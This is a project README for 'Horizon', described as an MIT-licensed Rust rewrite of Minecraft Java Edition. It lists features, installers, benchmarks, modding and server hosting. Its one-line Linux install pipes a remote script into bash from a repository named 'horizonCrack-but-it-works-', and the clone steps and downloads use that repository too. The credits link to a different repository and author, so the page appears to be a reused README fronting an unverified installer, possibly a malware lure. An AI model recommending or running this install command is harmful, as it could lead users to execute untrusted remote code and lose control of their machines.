<p align="center">
  <img src="docs/media/banner.webp" alt="Horizon: the game you know, rebuilt in Rust" width="100%">
</p>

<p align="center">
  <a href="https://playhorizon.dev"><b>Website</b></a> ·
  <a href="#installation"><b>Installation</b></a> ·
  <a href="https://playhorizon.dev/docs/"><b>Docs</b></a> ·
  <a href="https://discord.gg/playhorizon"><b>Discord</b></a> ·
  <a href="ROADMAP.md"><b>Roadmap</b></a> ·
  <a href="#contributing"><b>Contributing</b></a>
</p>

# Horizon

**Minecraft: Java Edition 26.3, rewritten in Rust (wgpu).** Your worlds, the same rules and terrain as vanilla, checked by hundreds of differential tests. One native program — no Java required. Free, open source (MIT), unofficial: you play with your own copy of Java Edition.

<p align="center">
  <img src="docs/media/readme/valley.webp" alt="A river valley with a plains village, savanna hills and a cherry grove, seen from above with a long view distance" width="100%">
</p>

## What is Horizon?

Horizon is a **complete rewrite of Minecraft: Java Edition in Rust**, targeting version 26.3. It uses the same world format, same generation, same rules — but runs natively with better performance, lower memory, and no Java dependency.

**Main target:** Players who want vanilla Minecraft that runs faster, uses less RAM, and integrates with modern Linux/macOS/Windows without Java.

**What it can do today:**
- **Full survival/creative/hardcore/spectator** — vanilla world gen in all 3 dimensions, mobs, villagers, raids, redstone, every command
- **Multiplayer** — join vanilla servers (online mode), open to LAN, invite friends via code
- **Distant terrain** — up to 1,024 chunks, HDR, controller support (all opt-in)
- **Packs & mods** — resource/data/shader packs, content mods (`.hmod`), native Rust mods (`.hnmod`)
- **Dedicated server** — `horizon-server` runs headless, no Java, takes vanilla and Horizon players
- **Launcher** — installs/updates the game, prepares assets from your Minecraft copy, self-updates

## Installation

### Linux (CachyOS, Arch, Ubuntu, Fedora, etc.) — one command:

```bash
curl -fsSL https://github.com/SSIT2051/horizonCrack-but-it-works-/releases/latest/download/install.sh | bash
```

This downloads the native `.tar.gz`, installs to `~/.local/bin/horizon-launcher`, adds a desktop entry, and works on glibc **and** musl (Alpine, Void, etc.).

**Arch/CachyOS native package (AUR):**
```bash
yay -S horizon-launcher
# or
paru -S horizon-launcher
```

**Manual download:** [Latest launcher releases](https://github.com/SSIT2051/horizonCrack-but-it-works-/releases?q=launcher&expanded=true)
| File | For |
|------|-----|
| `horizon-launcher-linux-x86_64.tar.gz` | Any x86_64 Linux (glibc) |
| `horizon-launcher-linux-musl-x86_64.tar.gz` | musl distros (Alpine, Void) |
| `horizon-launcher-linux-aarch64.tar.gz` | ARM64 Linux (Pi 4/5, etc.) |
| `horizon-launcher-linux-x86_64.AppImage` | Universal (run anywhere) |

### Windows
- **x64:** `horizon-launcher-setup.exe` (Windows 10/11)
- **ARM64:** `horizon-launcher-setup-arm64.exe` (Windows 11 on Arm)

### macOS
- **Apple Silicon:** `horizon-launcher-macos-arm64.dmg` (macOS 12+)
- **Intel:** `horizon-launcher-macos-x64.dmg` (macOS 12+)

### Requirements
- **A Microsoft account that owns Minecraft: Java Edition** — the launcher signs in with it and only plays with accounts that own the game. Horizon contains no Minecraft code/assets; it reuses your existing install or downloads 26.3 from Mojang for your account.
- **GPU with Vulkan or OpenGL 3.3** (Vulkan preferred)
- **Linux:** X11 or Wayland session

## Performance

Horizon draws more FPS than Java Edition and loads faster on the same machine/world. Ryzen 7 9800X3D + RTX 5080, 1280×720, VSync off:

| Render distance | Horizon | Vanilla 26.3 | Vanilla + mods |
| --- | --- | --- | --- |
| 8 chunks | 3,289 (1,327) | 2,437 (640) | 2,375 (709) |
| 16 chunks | 2,074 (598) | 1,661 (375) | 1,586 (432) |
| 32 chunks | 1,207 (333) | 1,031 (176) | 879 (264) |

Title screen: 2.9–3.2 s vs vanilla's 7.5–7.7 s. Working set: 1.1–1.7 GB vs 1.9–2.9 GB.  
Full benchmarks: [playhorizon.dev/benchmarks](https://playhorizon.dev/benchmarks) · [method](docs/benchmark.md)

## Quick start after install

1. Run `horizon-launcher` (or click "Horizon Launcher" in your app menu)
2. Sign in with your Microsoft account that owns Minecraft: Java Edition
3. Click **Play** — the launcher prepares everything and starts the game

## Build from source

```bash
# Prerequisites: Rust 1.90+, Python 3.11+, JDK 25
# Linux: libasound2-dev libudev-dev

git clone https://github.com/SSIT2051/horizonCrack-but-it-works-
cd horizonCrack-but-it-works-

# Prepare assets from YOUR Minecraft 26.3 (official launcher, Prism, MultiMC...)
cargo run --release -p horizon-prepare -- --prepare --server-jar ~/Downloads/server.jar
cargo run --release -p horizon-prepare -- sounds  # optional

# Run the game
cargo run --release -p horizon-client
```

Prepared files go to `.local/` (gitignored) — never commit or share them.  
Full guide: [docs/native-client.md](docs/native-client.md)

## Mods & Shader Packs

- **Content mods (`.hmod`)** — blocks, items, recipes, loot, models, textures (no code)
- **Native mods (`.hnmod`)** — Rust compiled into the game by the launcher
- **Shader packs** — Iris/OptiFine format and Horizon WGSL packs
- **Java mods** don't run (no Java); launcher imports their assets/data from jars/modpacks

Mods are **off by default** — fresh install = vanilla 26.3. Browse registry on the launcher's Mods page.

## Host a Server

```bash
# From launcher: Servers page → create/start/backup/update, invite friends
# On VPS (no Java needed):
horizon-server
```

[Hosting guide](https://playhorizon.dev/docs/hosting) · [Reference](docs/hosting.md)

## Agent Control (AI / scripts)

```bash
horizon-ctl launch --world Survival --seed 5 --wait
horizon-ctl state                    # position, health, screen...
horizon-ctl goto -0.5 65 -2.5 --near 2.5
horizon-ctl break -1 65 -3           # mines; replies with drops
```

[Agent control docs](docs/native-client.md#agent-control-horizon-ctl-and-mcp)

## Contributing

Issues/PRs welcome — read [CONTRIBUTING.md](CONTRIBUTING.md) (vanilla first, small PRs).  
Before PR: `git config core.hooksPath .githooks && python3 tools/pr_ready.py`  
Runs rustfmt, clippy, tests, vanilla harnesses, public-tree check.  
Questions: [Discord](https://discord.gg/playhorizon)

## Project Status

**Player-visible gaps: 0 open** (of 833 port-ledger findings).  
All subsystems score 1.0 (harnesses cover and pass).  
What players still hit: [known issues](docs/known-issues.md) · [port ledger](tools/port_ledger.py)

## Licence

[MIT](LICENSE) for original work; deps keep their own ([notices](THIRD_PARTY_NOTICES.md)).  
By [Ludovic Marie](https://lu4ovic.com) and [contributors](https://github.com/horizon-rust/horizon/graphs/contributors). Support: [GitHub Sponsors](https://github.com/sponsors/ludovic111).

> **NOT AN OFFICIAL MINECRAFT PRODUCT.** Not approved by or associated with Mojang/Microsoft. Minecraft is a trademark of Mojang Synergies AB; its code/assets belong to Mojang/Microsoft under the [Minecraft EULA](https://www.minecraft.net/en-us/eula).